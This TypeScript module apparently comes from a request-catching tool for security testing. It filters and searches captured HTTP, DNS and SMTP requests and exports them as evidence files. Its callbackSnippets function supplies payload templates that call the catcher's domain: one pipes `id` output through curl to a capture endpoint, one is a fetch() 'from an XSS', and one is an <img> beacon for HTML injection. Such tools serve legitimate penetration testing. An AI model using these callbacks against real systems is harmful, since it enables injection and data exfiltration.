import type { Request } from "@/types";

// WebSocket requests are immutable. A WeakMap avoids retaining deleted payloads.
const searchCache = new WeakMap<
  Request,
  { metadata: string; payload?: string }
>();

export function matchesRequest(request: Request, query: string): boolean {
  const needle = query.trim().toLowerCase();
  if (!needle) return true;
  let searchable = searchCache.get(request);
  if (!searchable) {
    const metadata: Record<string, unknown> = { ...request };
    delete metadata.raw;
    if (request.type === "smtp") {
      metadata.attachments = request.attachments?.map((attachment) => ({
        filename: attachment.filename,
        content_type: attachment.content_type,
        size: attachment.size,
      }));
    }
    searchable = {
      metadata: JSON.stringify(metadata).toLowerCase(),
    };
    searchCache.set(request, searchable);
  }
  if (searchable.metadata.includes(needle)) return true;
  if (searchable.payload === undefined) {
    try {
      const binary = atob(request.raw);
      const bytes = new Uint8Array(binary.length);
      for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
      searchable.payload = new TextDecoder().decode(bytes).toLowerCase();
    } catch {
      // Cache failures too: malformed captures should not retry on each keystroke.
      searchable.payload = "";
    }
  }
  return searchable.payload.includes(needle);
}

export interface QueueFilters {
  http: boolean;
  dns: boolean;
  smtp: boolean;
  search: string;
  onlyBookmarks: boolean;
  bookmarks: Record<string, boolean>;
}
export function visibleRequests(
  requests: Request[],
  filters: QueueFilters,
): Request[] {
  return requests
    .filter((request) => {
      if (!filters[request.type]) return false;
      if (filters.onlyBookmarks && !filters.bookmarks[request._id])
        return false;
      return matchesRequest(request, filters.search);
    })
    .sort((a, b) => a.date - b.date);
}

export function callbackSnippets(
  httpDomain: string,
  dnsDomain: string,
  scheme: "http" | "https",
) {
  const url = `${scheme}://${httpDomain}`;
  return [
    {
      label: "GET",
      detail: "Plain request",
      code: `curl '${url}/probe'`,
    },
    {
      label: "POST",
      detail: "Pipe output in",
      code: `id | curl --data-binary @- '${url}/capture'`,
    },
    {
      label: "DNS",
      detail: "Lookup only",
      code: `nslookup probe.${dnsDomain}`,
    },
    {
      label: "fetch()",
      detail: "From an XSS",
      code: `fetch('${url}/probe', {mode: 'no-cors'})`,
    },
    {
      label: "<img>",
      detail: "HTML injection",
      code: `<img src="${url}/beacon" alt="">`,
    },
    {
      label: "SMTP",
      detail: "Test mail",
      code: `swaks --to test@${dnsDomain} --from ctf@example.com --server ${dnsDomain.split(".").slice(1).join(".")} --port 25`,
    },
  ];
}

export function createEvidence(
  subdomain: string,
  requests: Request[],
  bookmarks: Record<string, boolean>,
  notes: Record<string, string>,
) {
  return {
    format: "kebabengineers-requestlab-v1",
    exportedAt: new Date().toISOString(),
    subdomain,
    requests: requests.map((request) => ({
      ...request,
      bookmarked: !!bookmarks[request._id],
      note: notes[request._id] ?? "",
    })),
  };
}

export function downloadEvidence(
  subdomain: string,
  requests: Request[],
  bookmarks: Record<string, boolean>,
  notes: Record<string, string>,
) {
  const blob = new Blob(
    [
      JSON.stringify(
        createEvidence(subdomain, requests, bookmarks, notes),
        null,
        2,
      ),
    ],
    { type: "application/json" },
  );
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = `kebab-${subdomain}-${new Date().toISOString().replace(/[:.]/g, "-")}.json`;
  link.click();
  setTimeout(() => URL.revokeObjectURL(url), 1000);
}
